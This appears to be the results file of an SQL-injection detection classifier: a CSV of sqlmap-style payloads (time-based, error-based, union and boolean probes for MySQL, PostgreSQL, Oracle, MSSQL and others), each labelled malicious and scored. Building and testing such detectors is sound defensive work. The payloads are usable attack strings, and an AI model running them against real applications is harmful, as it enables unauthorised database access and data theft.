Query,Label,predicted,correct,malicious_probability
"1""   )    )     )   and 4124  =  7245 and    (    (     (  ""tuom""  =  ""tuom",1,1,True,0.9607758331424497
1'  )   as irnj where 7274  =  7274 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,1,True,0.9996616708832381
1'   )    )    as fqia where 1936  =  1936 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1,1,True,0.9990664435344905
-1479%' or 5201  =  3398--,1,1,True,0.986571765055672
1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',1,1,True,0.9705788315257461
if  (  8264  =  1939  )   select 8264 else drop function nsoq--,1,1,True,0.9119846940137816
"1  )   as skby where 4269  =  4269 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1,1,True,0.9952690757638034
"1'||  (  select 'hfbt' where 7204  =  7204 union all select null,null,null,null,null,null,null,null,null,null--",1,1,True,0.988714544709952
"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,True,0.9883923938070016
"1""  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""gozk""  =  ""gozk",1,1,True,0.9689722812626859
"1""   )    )     )   union all select null,null,null,null,null,null--",1,1,True,0.972501354102514
"1   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,True,0.9950019294818684
"-3805""   )    )     )   union all select 9123,9123,9123,9123,9123,9123,9123,9123#",1,1,True,0.8800799831388106
"-4970'  )   union all select 4625,4625,4625,4625,4625,4625,4625,4625#",1,1,True,0.9375741031622548
"1'  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1,1,True,0.9821545611991283
"1""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1,True,0.9674518814647846
1'  )   where 8204  =  8204,1,1,True,0.9868407144287282
"1'   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  'llfp'  =  'llfp",1,1,True,0.9833877824714312
1'   )    )    as wuws where 6917  =  6917 union all select null#,1,1,True,0.9742014430129694
"1 and elt  (  2770  =  3669,3669  )  # sfls",1,1,True,0.9960078293782885
"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",1,1,True,0.9726192033813648
"1""   )    )    as riui where 2605  =  2605",1,1,True,0.9342428259903586
"1' and make_set  (  8403  =  8403,8899  )   and 'lnwe'  =  'lnwe",1,1,True,0.9828014447229174
"-5043%'   )    )     )   union all select 5860,5860,5860,5860,5860#",1,1,True,0.9373847342320645
1  )   waitfor delay '0:0:5'--,1,1,True,0.9993126092460046
-8519%'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   '%'  =  ',1,1,True,0.9571772014617957
"1"" and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""jgcv""  =  ""jgcv",1,1,True,0.9695877033998209
"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",1,1,True,0.9896162013606705
"1'   )    )    as peeo where 5356  =  5356 and elt  (  4722  =  2382,2382  )  --",1,1,True,0.9933320174522301
"1'+  (  select ijck where 9961  =  9961 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1,1,True,0.9761641182005212
"1'  )   where 2121  =  2121 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,True,0.9978864149116285
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'xjvr'  =  'xjvr",1,1,True,0.9982166046455704
"-1270'||  (  select 'mgdi' where 6785  =  6785 union all select 6785,6785#",1,1,True,0.9550138747692587
"1""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""sdps""  =  ""sdps",1,1,True,0.9916698880571729
"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,1,True,0.9995026098498152
1%'   )    )     )   rlike   (  select   (  case when   (  7697  =  3334  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',1,1,True,0.9803072421023457
"1'||  (  select 'ymac' from dual where 9268  =  9268 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",1,1,True,0.9946952203079789
waitfor delay '0:0:5' and   (  'gpqx' like 'gpqx,1,1,True,0.9967381170293129
"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",1,1,True,0.9185609164910875
1%'   )    )     )   and 7533  =  7533 and    (    (     (  '%'  =  ',1,1,True,0.9809568862146646
1'   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  'bwka'  =  'bwka,1,1,True,0.9980210911780881
"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--",1,1,True,0.958025470921252
"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""tbdl"" like ""tbdl",1,1,True,0.941793728425127
"1""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""ecoa"" like ""ecoa",1,1,True,0.9218274698000081
"1%""  )   rlike sleep  (  5  )  #",1,1,True,0.9982467183203729
"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'gtov' like 'gtov",1,1,True,0.9951385135595396
1' in boolean mode  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #,1,1,True,0.9839681063712085
"1'   )    )    as qwdh where 7581  =  7581 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,True,0.9965094977894472
select case when 3661  =  9315 then 1 else null end--,1,1,True,0.9733868514792297
"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",1,1,True,0.9706199012577257
"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--",1,1,True,0.9638257361772656
-2951 or 4189  =  2291,1,1,True,0.9248200418167883
"1' in boolean mode  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   #",1,1,True,0.9956482278131114
"1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   ",1,1,True,0.9940312777805261
1'||  (  select 'ytwz' from dual where 3025  =  3025 and   (  5039  =  5303  )  *5303  )  ||',1,1,True,0.9897174427703308
end and   (  9416  =  9416,1,1,True,0.9127251342957907
"1%'  )   union all select null,null,null,null#",1,1,True,0.940490048328426
"select * from generate_series  (  7536,7536,case when   (  7536  =  7523  )   then 1 else 0 end  )   limit 1--",1,1,True,0.9954519372820889
"1""   )    )    as femc where 1313  =  1313 and 4595  =  4595#",1,1,True,0.9482264630916274
"1"" where 4298  =  4298 order by 1--",1,1,True,0.993029080477188
-1468'   )    )     )   or 4875  =  6163#,1,1,True,0.9505855634207888
"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,True,0.9877890713323546
-3062'   )    )    or 6872  =  6872 and    (    (   'uzth' like 'uzth,1,1,True,0.969243793245381
"-1407 where 1186  =  1186 union all select 1186,1186,1186,1186,1186--",1,1,True,0.9730544097464114
"-1370'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'xmrg'  =  'xmrg",1,1,True,0.9926851011851769
"1%"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,1,1,True,0.9742582826140033
"-9509  )   union all select 1193,1193,1193#",1,1,True,0.9388537534391065
"1""   )    )    as azak where 4911  =  4911",1,1,True,0.9414686885962203
"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1,1,True,0.9794504526355876
"1'   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  'qpuy'  =  'qpuy",1,1,True,0.985392141234322
"1' where 8837  =  8837 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.9884971119904041
"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""auyv""  =  ""auyv",1,1,True,0.9809110162702673
1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,True,0.9997959909346188
1'   )    )     )   and 4595  =  4595#,1,1,True,0.9822519988302917
"1  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,True,0.987952755188051
"1""  )   as ymto where 3453  =  3453",1,1,True,0.9356244668366288
"-7320""  )   where 3907  =  3907 union all select 3907,3907--",1,1,True,0.9714505590518273
"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  # mafe",1,1,True,0.9644981050045084
"-1663' or elt  (  1032  =  1032,3623  )   and 'yqaj' like 'yqaj",1,1,True,0.9866011083627966
-3578'   )    )     )   order by 1--,1,1,True,0.9982970194753623
"1%'   )    )     )   union all select null,null,null#",1,1,True,0.9468536968117883
"select sleep  (  5  )   and   (  ""tlbj"" like ""tlbj",1,1,True,0.9874392784698354
"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'drvk' like 'drvk",1,1,True,0.9732588048383805
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",1,1,True,0.9850102100597267
"1' in boolean mode  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  #",1,1,True,0.9677965405037054
"-3834'   )    )     )   union all select 8313,8313--",1,1,True,0.9763537375856602
-8248 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1,1,True,0.996081874607773
"1   )    )    as juoe where 9994  =  9994 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,True,0.9403870368328212
"1' where 8950  =  8950 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.9920227947301103
1' where 3701  =  3701 and 2006  =  2006,1,1,True,0.9855610525366578
"-1668""   )    )     )   or 9323  =  9323#",1,1,True,0.9136670598745402
"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",1,1,True,0.9898594339358213
"1""  )   rlike   (  select   (  case when   (  5746  =  5367  )   then 1 else 0x28 end   )    )    and   (  ""hnnf"" like ""hnnf",1,1,True,0.9674551066856891
1'   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'cgiu'  =  'cgiu,1,1,True,0.9841434401108151
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'jzpb'  =  'jzpb,1,1,True,0.9910703509725552
"1'  )   where 8255  =  8255 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.9890351049386834
"1%""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,1,1,True,0.9893397138055735
"1'+  (  select pxsd where 2576  =  2576 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +'",1,1,True,0.9619144639455234
-2207%'  )   or   (  8459  =  8459  )  *4906 and   (  '%'  =  ',1,1,True,0.974687273938192
"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd",1,1,True,0.9860567815289577
1'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  'cmqe' like 'cmqe,1,1,True,0.9972236347945893
"-6766"" where 6591  =  6591 or make_set  (  9354  =  9354,7185  )  --",1,1,True,0.987915892118943
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  8997  =  8997",1,1,True,0.9724654376374294
-7610' or 3038  =  3038,1,1,True,0.9556474628660936
1'||  (  select 'gmkp' where 6016  =  6016,1,1,True,0.9849609776091183
"1,  (  case when 6620  =  3092 then 1 else null end  )  ",1,1,True,0.9249327362889118
"1%""   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""%""  =  """,1,1,True,0.8058746534108124
"1  )   and elt  (  1210  =  1210,sleep  (  5   )    )   ",1,1,True,0.9912118050395334
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   7240  =  7240",1,1,True,0.9579115417479339
"-4155'   )    )     )   union all select 1775,1775,1775,1775,1775,1775,1775--",1,1,True,0.9843676554490072
"-8021'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cenk' like 'cenk",1,1,True,0.9830820194115356
"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  """,1,1,True,0.9511085716271069
"1,  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1,1,True,0.9780640855892447
"1  )   and elt  (  4249  =  4249,7259  )   and   (  8226  =  8226",1,1,True,0.9317236888513514
-6190'   )    )     )   union all select 9413--,1,1,True,0.9795281710714621
"1"" where 5372  =  5372 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,True,0.9961268643872198
"-4653' or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,True,0.9906797188194071
1'   )    )    and 6690  =  3250#,1,1,True,0.9880308879874174
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq   )    )   ||',1,1,True,0.9961943765405828
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'vwxg'  =  'vwxg",1,1,True,0.9769977462051342
select   (  case when   (  2676  =  4191  )   then 2676 else 1/  (  select 0  )   end  )  --,1,1,True,0.9829764738595597
-6548 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- rlda,1,1,True,0.9912056350219698
"select * from generate_series  (  9863,9863,case when   (  9863  =  3285  )   then 1 else 0 end  )   limit 1--",1,1,True,0.9948572127946991
"1'||  (  select 'yaii' from dual where 7317  =  7317 union all select null,null,null,null,null,null,null,null,null#",1,1,True,0.9760892414699529
"1"" or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.980571573597964
"-5591%""   )    )    order by 1--",1,1,True,0.998326474228512
1'  )   where 4949  =  4949,1,1,True,0.9816420512531191
"1""   )    )    as sqow where 8752  =  8752",1,1,True,0.9503657054150672
"1  )   where 8008  =  8008 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.9837786676868737
"1""  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1,True,0.9672170489648884
"1""  )   as frmp where 6073  =  6073",1,1,True,0.9622382306321998
"1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1,1,True,0.9464583333202561
-2411 or   (  8459  =  8459  )  *4906# pxwg,1,1,True,0.9677210219967008
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,1,True,0.9807801126809724
"1%"" union all select null,null,null--",1,1,True,0.9752428261260454
"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",1,1,True,0.9414746910024407
select   (  case when   (  3716  =  4021  )   then 3716 else 3716*  (  select 3716 from information_schema.character_sets  )   end  )  #,1,1,True,0.9920581288826922
"-2111' union all select 1061,1061,1061--",1,1,True,0.9971913798352621
"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,1,True,0.9968399085514298
"-8060""  )   where 5290  =  5290 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1,1,True,0.9981046561078427
"-5170'   )    )    as ovbf where 4833  =  4833 union all select 4833,4833,4833,4833--",1,1,True,0.9740287666186639
1' where 5103  =  5103,1,1,True,0.9865624734755746
"-8771""   )    )    union all select 6302,6302,6302,6302,6302#",1,1,True,0.9056186483169941
"1,  (  select   (  case when   (  8640  =  8640  )   then   (  ascii  (  regexp_substring  (  repeat  (  right  (  char  (  8640  )  ,0  )  ,500000000  )  ,null   )    )     )   else 8640/  (  select 0 from information_schema.system_users  )   end  )   from information_schema.system_users  )  --",1,1,True,0.9958848740048148
"-1573""  )   union all select 3928,3928,3928,3928--",1,1,True,0.9603274869507927
1  )   rlike sleep  (  5  )   and   (  5724  =  5724,1,1,True,0.9897510447917213
1  )   where 7096  =  7096,1,1,True,0.9629036618186186
-3166'||  (  select 'mtan' from dual where 9420  =  9420 union all select 9420#,1,1,True,0.9721065059679397
1   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   3069  =  3069,1,1,True,0.9973791865606718
1,1,1,True,0.949732111598164
1 where 4787  =  4787,1,1,True,0.9410575851853823
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1,1,True,0.9920942115747688
"-4635"" union all select 5087,5087,5087,5087,5087,5087,5087,5087,5087,5087#",1,1,True,0.9193306948999039
"1""   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,True,0.9904680685087178
"1%""  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""%""  =  """,1,1,True,0.948126343724697
"1'   )    )     )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'isyg'  =  'isyg",1,1,True,0.9920014625915529
"1"" where 2989  =  2989 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,True,0.9910343592503387
"-5024%"" or make_set  (  3321  =  7355,7355  )   and ""%""  =  """,1,1,True,0.9188458493368917
"1""   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  ""suxh""  =  ""suxh",1,1,True,0.9408445647623824
select   (  case when   (  2593  =  3592  )   then 2593 else 2593*  (  select 2593 from information_schema.character_sets  )   end  )  #,1,1,True,0.9924707519981898
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # couj",1,1,True,0.9935355036329071
"1%' and make_set  (  8403  =  8403,8899  )   and '%'  =  '",1,1,True,0.9769074769176257
"1   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,True,0.9842885127619609
"1%'   )    )     )   union all select null,null,null,null,null,null,null--",1,1,True,0.9827573551394146
"1'||  (  select 'hdpi' where 5620  =  5620 and make_set  (  8403  =  8403,8899   )    )   ||'",1,1,True,0.9876441479641394
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1,1,True,0.9961862795135229
"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",1,1,True,0.9784580055502556
"1'  )   where 5883  =  5883 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,True,0.9873181886299293
"1'  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,True,0.9931600933551727
"-8256""   )    )     )   or 6872  =  6872 and    (    (     (  ""lrtu""  =  ""lrtu",1,1,True,0.9147697605275529
"1' where 3339  =  3339 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,1,True,0.9979881564574742
select   (  case when   (  2056  =  1917  )   then 2056 else 1/  (  select 0  )   end  )  --,1,1,True,0.9870438274121813
"1%""   )    )    or sleep  (  5  )  #",1,1,True,0.9986663084652334
" end and    (    (     (  ""revx""  =  ""revx",1,1,True,0.8396997759855643
"1%' union all select null,null,null,null--",1,1,True,0.9848012748851204
"1%' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,True,0.9961242929206251
1%'   )    )    rlike sleep  (  5  )   and    (    (   '%'  =  ',1,1,True,0.9946014521527212
"1""   )    )    as zval where 2255  =  2255 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1,1,True,0.9927458196334469
"1  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1,1,True,0.9922132931365553
"1'   )    )    as bsvk where 5985  =  5985 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,1,True,0.9880981061392186
